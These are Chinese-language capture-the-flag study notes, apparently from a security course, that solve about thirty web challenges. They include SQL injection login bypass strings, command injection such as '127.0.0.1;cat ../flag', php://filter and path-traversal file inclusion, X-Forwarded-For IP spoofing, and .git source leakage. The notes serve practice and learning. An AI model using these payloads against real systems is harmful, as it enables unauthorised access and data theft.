# WEB
### 第一題 robots.txt
打上robots.txt看她噴出的東西
![](https://i.imgur.com/7YeuurU.png)


### 第二題 CUTE.JS
把CUTE.JS GOOGLE 它發現式加密方式 在GOOGLE解碼網站
![](https://i.imgur.com/NfWxHgR.png)
- [解密網站](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html)



### 第三題
這一題本身就是CMD，所以先使用ls查看有什麼東西，然後在用cat瀏覽出Flag。
![](https://i.imgur.com/STdx5c8.png)


### 第四題
在source裡面找到Flag。
![](https://i.imgur.com/YCBXI76.png)


# 第五題     (努力中)未解出
解法:捏造php物件給伺服器然後直接跳到else 去滿足條件，還沒實作出來。

php(基礎語法):

- PHP require_once :用法與單純的 require 幾乎完全一樣，但差別是 require_once 在為主體 PHP 檔案包含進來的檔案僅能一次，不會重覆包含進來，所以如果每個外掛檔案都只能出現一次，就使用 require_once 吧！

- isset:判斷的是 "變數"，isset()函數是用來判斷變數是不是有存在，如果有就回傳 1(true)，如果沒有就回傳空值

- empty:判斷的是 "值"

- unserialize():函数用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。

- REMOTE_ADDR:PHP有一項語法可以直接取得到一般使用者IP。
- hackersir.org
### 第六題
先把裡面提示的代碼，有顯示帳號密碼然後是加密的，decoder回去在放上去就是答案[再使用decoder工具](https://coderstoolbox.net/string/#!encoding=base64&action=decode&charset=us_ascii)Base54.encoder解出。
![](https://i.imgur.com/diwir9g.png)


### 第七題
它給我們的是跳轉後的網址，所以呢我們開啟linux，使用curl抓網址，先把data這個刪掉，curl+網址得出我們的CTF。概念是轉址時curl可以先抓到未被轉址的網頁
![](https://i.imgur.com/PmV4LnO.png)



### 第八題
從element找出/favicon.ico 然後記得+上/ 輸入到網址 然後掃QRCODE發現Flag
![](https://i.imgur.com/6iG6upK.png)
![](https://i.imgur.com/ZUXa3lf.png)


### 第九題
這是解密過程，然後其實下面就是答案了。
![](https://i.imgur.com/nxp04LF.png)


### 第十題 SQL injection
![](https://i.imgur.com/N5bP0Ef.png)
帳號:' or '1'='1' #
密碼:隨便


### 第十一題 Alax
理解ajax功能，傳送更改東西時，回傳回去部分修改資料。
![](https://i.imgur.com/Eu8PZRH.png)



### 第十二題 MD5
解密回去，不一定每一個都能解的回去
使用工具[解密網站](https://md5decrypt.net/en/#answer)

### 第十三題 cookie
GOOGLE cookie怎麼編碼的，然後使用[URL編碼](http://www.convertstring.com/zh_TW/EncodeDecode/UrlEncode)然後解碼發現admin0 那我們改成1，丟回去以管理員身分開啟，就能拿到Flag。

### 第十四題 REVERSE
用記事本打開它，然後Flag就出現了 YA~~~~~~~~~~。

# week1
### 第十五題_HolyGrenade
先了解pyc在做啥的，然後pyc [decompyle_網站](https://tool.lu/pyc/) 回去，發現一串加密過程
```python=
from hashlib import md5

def rearrange(arg):
    arg = bytearray(arg, 'ascii')
    for i in range(0, len(arg), 4):
        a = arg[i]
        b = arg[i + 1]
        c = arg[i + 2]
        d = arg[i + 3]
        arg[i + 2] = d
        arg[i + 1] = a
        arg[i + 3] = b
        arg[i] = c
    
    return arg.decode('ascii')

flag = open('flag', 'r').read()
for i in range(0, len(flag), 4):
    print rearrange(md5(bytes(flag[i:i + 4])).hexdigest())
```
在寫回去:
```python=
f = open("flag",'r').read().split('\n')[:-1]
def rearrange( arg ):
    arg = bytearray(arg,'ascii')
    for i in range(0,len(arg),4):
        a = arg[i]
        b = arg[i+1]
        c = arg[i+2]
        d = arg[i+3]
        arg[i+1] = d
        arg[i+2] = a
        arg[i] = b
        arg[i+3] = c
    return arg.decode('ascii')
for i in f:
    print(rearrange(i))
```
得出 一長串東西，在[md5_網站](https://hashkiller.co.uk/Cracker/MD5)回去開開心心flag出來。


### 第十六題 TsaiBro
首先先認識 敲打密碼，就是要麻爆破，要嘛寫腳本，跑出flag。
寫好的腳本===>[AIS3_官方解法](http://blog.terrynini.tw/tw/2019-AIS3-%E5%89%8D%E6%B8%AC%E5%AE%98%E6%96%B9%E8%A7%A3/)
```python=
table = ['a','b','c','d','e','f','g','h',
'i','j','k','l','m','n','o','p',
'q','r','s','t','u','v','w','x',
'y','z','A','B','C','D','E','F',
'G','H','I','J','K','L','M','N',
'O','P','Q','R','S','T','U','V',
'W','X','Y','0','1','2','3','4',
'5','6','7','8','9','{','}','_']
f = open("flag_2.txt","r").read().split('\n')[1]
f = f.split("發財")[1:]
for i in range(0,len(f),2):
    print(table[(len(f[i])-1)*8+len(f[i+1])-1],end='')
```
### 第十七題 Regular
google
### 第十八題 SJKCUF 
敲敲敲 通靈 發現題目其實是 FUCKJS，又通靈要把東西逆過去，所以我們原本要把那長串jother的東西，寫個pytohn腳本逆回去，然後在貼到網頁上的console，因為jother其實是JS的產物。
```python=
def reverse1():
s=input("請輸入需要反轉的內容：")
return s[::-1]
reverse1()
```

### 第十九題 LFI(Local File Inclusion)
這題是php那邊會發現網址，有被動手腳php://filter/read=convert.base64-encode/resource=./index，加上這個東西，接噴出一大串加密網頁，在decode回去
- 漏洞原因
    主要是php文件里include, require,include_once, require-once 函数不恰当使用引起的。
    
### 第二十題   (http://ctf.hackersir.org:10016/index.php?source)
解出這個東西
a:1:{s:7:"user_id";i:11;}
a%3A1%3A%7Bs%3A7%3A%22user_id%22%3Bi%3A11%3B%7D
![](https://i.imgur.com/J1LJDdW.png)

### 第二十一題
- [參考網址](https://blog.csdn.net/xiangshangbashaonian/article/details/801573)
- google取得IP方式發現，假IP都是來自於X-Forwarded-For 這個東西，所以更改他向伺服器請求然後就可以更改正確ip位置。


```python=

import requests
url="http://ctf.hackersir.org:10021/"
requests.get(url,headers={'X-Forwarded-For'
 : '127.0.0.1'})
print(requests.get(url,headers={'X-Forwarded-For'
 : '127.0.0.1'}).text)  
```
### 第二十二題 robot.txt
![](https://i.imgur.com/6UJpiNl.png)
robot.txt然後![](https://i.imgur.com/1exfc5j.png)

### 第二十三題 [BreakAllCTF](http://140.110.112.32:1001/)
直接就在 source
### 第二十四提 [GitHack](http://140.110.112.32:4004)
- 有/.git/ 漏洞，因為說source 外流
- 載下來[GitHack](https://github.com/lijiejie/GitHack)
![](https://i.imgur.com/dR3z7HV.png)

### 第二十五題[DVWA](http://43.247.91.228:81/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=include.php)
- page=php://filter/convert.base64-encode/resource=include.php
- 示範噴出網頁php內容

### 第二十題[CommandCTF](http://140.110.112.32:1004/index.php)
127.0.0.1;cat ../flag
### 第二十七題[LFI](http://140.110.112.32:2003/index.php?page=index.php)
http://140.110.112.32:2003/index.php?page=../../../../../flag
### 第二十七題[DVWA_Command Execution](http://43.247.91.228:81/vulnerabilities/exec/#)
- 127.0.0.1 local host
- +上 ; | & ls 
- 發現有東西127.0.0.1;ls source -al
- al 用來看為檔案ORfile
### 第二十八題[SQL injection](http://120.114.62.45:2002/index.php)
' /*!or*/ 1=1 #

### 第二十九題[Curl](http://140.110.112.32:2004/)
curl 網址記得要+上 index.php

### 第三十題[XSS](http://140.110.112.32/challenges#XSS)
找尋cookid 然後url decode